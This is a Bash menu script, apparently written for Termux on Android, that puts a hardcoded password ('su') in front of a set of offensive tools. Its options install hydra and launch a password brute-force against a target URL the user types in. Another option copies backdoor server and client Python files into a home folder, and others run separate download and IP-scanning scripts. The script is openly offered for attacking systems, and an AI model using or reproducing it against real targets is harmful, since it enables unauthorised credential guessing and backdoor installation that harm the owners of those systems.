
while true
do
echo "password... "
read pass
if [ $pass == "su" ]
then
	open 1.mp3
	break
fi
done
#############
while [ $pass == "su" ]
do
echo "==================>"
read shell
if [ $shell == "-h" ]
then
	open 1.mp3
	echo "(-h) Help"
	echo "(-i) Download Packages"
	echo "(-g) Guess began"
	echo "(-b) backdoor"
	echo "(-d) Download Scripts"
	echo "(-s) Scaning IP"
	echo "(-x) Exit"
fi
if [ $shell == "-i" ]
then
	open 1.mp3
	pkg install hydra
	echo "package: OK"
fi
if [ $shell == "-g" ]
then
	open 1.mp3
	echo "Enter name file: "
	read file
	echo "Target name(ex http://127.0.0.1:8080): "
	read victim
	hydra -l user -P $file $victim
fi
if [ $shell == "-b" ]
then
	open 1.mp3
	echo "Download Packages.."
	pkg install python3
	echo "Programing backdoor..."
	echo "server.."
	cd data/b && cp server.py /data/data/com.termux/files/home/tools/Home
	echo "client.."
	cp client.py /data/data/com.termux/files/home/tools/Home
	cd /data/data/com.termux/files/home/tools
	echo "OK ^_-"
	echo "Files inside the Home folder"
fi
if [ $shell == "-d" ]
then
	open 1.mp3
	cd data/d && ./download.sh
	cd /data/data/com.termux/files/home/tools
fi
if [ $shell == "-s" ]
then
	open 1.mp3
	cd data/s && ./scan.sh
	cd /data/data/com.termux/files/home/tools
fi
if [ $shell == "-x" ]
then
	open 1.mp3
	echo "BY...*_*"
	break
fi
done
